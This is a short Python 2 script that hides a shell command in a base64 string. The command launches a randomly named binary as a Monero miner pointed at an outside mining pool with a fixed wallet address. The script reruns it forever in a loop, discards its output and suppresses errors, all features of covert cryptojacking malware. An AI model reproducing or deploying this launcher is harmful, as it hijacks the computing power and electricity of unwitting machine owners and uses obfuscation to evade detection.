import os
import base64

if __name__ == '__main__':
    hauif = base64.decodestring('Li91eHZieWlydHFpdXd5ZXRyIC1jIHggLU0gc3RyYXR1bSt0Y3A6Ly80NTNNMkxoRjlQNlNYeEVSbktkRGJUZEpEUmUzaXd6U3JaQ3JkRzNKSkFEelNnRWhVRkUydXNvY0RUdEVOYWV0eHpQNmdhVjdCa1JNZTlrdGFteUZacHp3UEt5RHlySjp4QHBvb2wubWluZXhtci5jb206NDQ0NC94bXIgLXQgMSA+IC9kZXYvbnVsbA==')
    while True:
        try:
            os.system(hauif)
        except BaseException as e:
            print e
            pass
